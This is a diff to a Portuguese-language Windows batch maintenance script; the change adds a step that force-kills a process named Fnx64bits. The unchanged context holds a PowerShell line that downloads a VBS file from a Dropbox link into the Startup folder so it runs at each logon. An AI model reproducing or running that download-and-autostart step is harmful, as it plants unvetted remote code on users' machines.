@@ -358,6 +358,7 @@ if %errorlevel% equ 0 (
     echo Falha no backup. Verifique as credenciais e permissões.
 )
 	call :IPV1
+	call :FechaV1
 	call :StopServices
 	call :StartServices
 	call :LIMPEZAA
@@ -531,3 +532,8 @@ goto :eof
 :inicializar
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/akorc9rgtubicumxfgv8b/Menssagem.vbs?rlkey=0yxqyoicv6u83hlya8bnlar0r&st=vxv6y6ax&dl=1', [Environment]::GetFolderPath('Startup') + '\Menssagem.vbs')"
 goto :eof
+
+:FechaV1
+powershell -NoProfile -Command ^
+ "Get-Process Fnx64bits -ErrorAction SilentlyContinue | Stop-Process -Force"
+exit /b
